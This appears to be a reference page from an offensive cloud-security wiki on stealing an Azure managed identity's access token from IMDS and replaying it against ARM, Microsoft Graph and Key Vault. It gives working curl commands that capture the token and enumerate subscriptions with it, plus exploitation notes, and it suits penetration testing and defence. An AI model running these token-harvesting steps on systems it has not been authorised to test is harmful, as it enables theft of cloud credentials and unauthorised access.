---
title: "Managed identity token: minting a resource's token from IMDS"
description: "Requesting an access token for a resource's managed identity from the IMDS token endpoint and replaying it against ARM or Microsoft Graph."
keywords:
  - managed identity token
  - IMDS
  - access token
  - ARM
  - Microsoft Graph
---

# Managed identity token

A VM, Function, App Service, or container with a managed identity can ask IMDS for a bearer token for that identity. With code execution on the resource you make the same request and walk away with the token, then replay it against the Azure management API or Microsoft Graph as the identity.

## Requesting the token

```bash
# resource = the audience you want a token for
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

# other audiences: https://graph.microsoft.com/ , https://vault.azure.net , https://storage.azure.com/
```

On **App Service / Functions** there is no IMDS; the identity endpoint is injected as environment variables instead:

```bash
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

## Replaying it

```bash
TOKEN=$(curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq -r .access_token)
# enumerate what the identity can reach
curl -s -H "Authorization: Bearer $TOKEN" 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# or feed it to az
az account get-access-token >/dev/null 2>&1  # separate; or use the raw token with az rest --headers
```

## Exploitation notes

- A token is per-audience: mint one for `management.azure.com` to drive ARM, a second for `graph.microsoft.com` for directory reads, a third for `vault.azure.net` to read Key Vault.
- User-assigned identities need the `client_id` or `mi_res_id` parameter when a resource carries more than one; without it IMDS errors or returns the system-assigned one.
- The token typically lasts about an hour and cannot be refreshed from IMDS, so re-request it rather than storing it.
- What the identity can do is an [RBAC](../../identity/managed-identities/index.md) question; the token is only the key.

## Tools

- **curl** against the endpoint.
- **MicroBurst** (`Get-AzPasswords`, `Invoke-AzVMUserDataAgent`-style helpers) and **az rest** to replay tokens.

## References

- [Microsoft: get a token with a managed identity](https://learn.microsoft.com/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token)
- [HackTricks Cloud: Azure IMDS token](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [SpecterOps: Managed Identity attack paths (BARK)](https://github.com/BloodHoundAD/BARK)
